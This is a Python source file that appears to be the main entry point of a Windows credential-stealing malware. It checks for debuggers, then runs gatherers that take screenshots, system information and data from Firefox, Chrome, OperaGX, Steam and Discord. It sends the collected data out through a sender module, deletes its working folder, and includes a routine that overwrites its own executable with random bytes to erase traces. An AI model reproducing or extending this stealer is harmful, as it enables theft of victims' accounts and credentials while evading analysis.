import ctypes
import os
import logging
from shutil import rmtree
from sys import gettrace
from ctypes import windll
import sender
import utils
from program_detector import detect_programs
from gather import FileGatherer, FirefoxGatherer, ScreenshotGatherer, ChromeGatherer, Gatherer, SystemInfoGatherer, \
    SteamGatherer, OperaGXGatherer, DiscordGatherer
from utils import BASE_GATHER_FOLDER, USERNAME, SELF_EXEC_NAME, DEBUG_MODE


def get_gatherers(programs: dict[str:bool]) -> list[Gatherer]:
    gatherers = [ScreenshotGatherer(), SystemInfoGatherer()]
    if programs["Firefox"]:
        gatherers.append(FirefoxGatherer())
    if programs["Chrome"]:
        gatherers.append(ChromeGatherer())
    if programs["Steam"]:
        gatherers.append(SteamGatherer())
    if programs["OperaGX"]:
        gatherers.append(OperaGXGatherer())
    if programs["Discord"]:
        gatherers.append(DiscordGatherer())


    return gatherers


def detect_debugging() -> bool:  # True - нет дебагера и виртуалки
    debug = not windll.kernel32.IsDebuggerPresent() and gettrace() is None
    return debug


def dispose():
    if SELF_EXEC_NAME[-3:] == 'exe':
        os.system(f"fsutil randfill {SELF_EXEC_NAME} {os.path.getsize(SELF_EXEC_NAME) // 3}")


if __name__ == "__main__" and detect_debugging():
    if not os.path.isdir(BASE_GATHER_FOLDER):
        os.mkdir(BASE_GATHER_FOLDER)

    utils.logger_setup()
    detected_programs = detect_programs()
    gatherers = get_gatherers(detected_programs)
    for gatherer in gatherers:
        try:
            gatherer.gather()
        except Exception as e:
            logging.error(str(e))

    sender.send()
    # ОПЕРАЦИИ В КОНЦЕ:
    # run_firefox_decrypt(FirefoxGatherer.get_profiles())
    logging.shutdown()

    try:
        if not DEBUG_MODE:
            rmtree(BASE_GATHER_FOLDER)
        # dispose()
    except Exception as e:
        logging.error(str(e))
